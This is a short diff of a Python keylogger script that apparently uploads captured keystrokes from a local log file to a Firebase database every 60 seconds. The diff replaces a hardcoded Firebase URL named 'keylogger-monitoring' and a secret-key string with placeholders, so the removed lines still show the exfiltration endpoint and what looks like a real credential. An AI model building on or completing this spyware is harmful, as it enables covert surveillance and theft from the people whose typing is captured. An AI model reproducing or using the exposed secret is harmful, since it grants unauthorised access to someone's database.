@@ -11,8 +11,8 @@ from firebase import firebase  # pip install python-firebase
 
 # Configuration
 LOG_FILE = "system_log.txt"
-FIREBASE_URL = "https://keylogger-monitoring-default-rtdb.firebaseio.com/"
-FIREBASE_SECRET = "t-rtdb	UUSFtfZDNgv3o9jU5G6jW4MNWHufqvXDnjoOwRwd"  # From Project Settings > Service Accounts
+FIREBASE_URL = "Your Firebase project url"
+FIREBASE_SECRET = "firebase secret key"  # From Project Settings > Service Accounts
 UPLOAD_INTERVAL = 60  # seconds
 
 # Initialize Firebase
@@ -162,4 +162,5 @@ class KeyLogger:
 
 if __name__ == "__main__":
     logger = KeyLogger()
+
     logger.run()
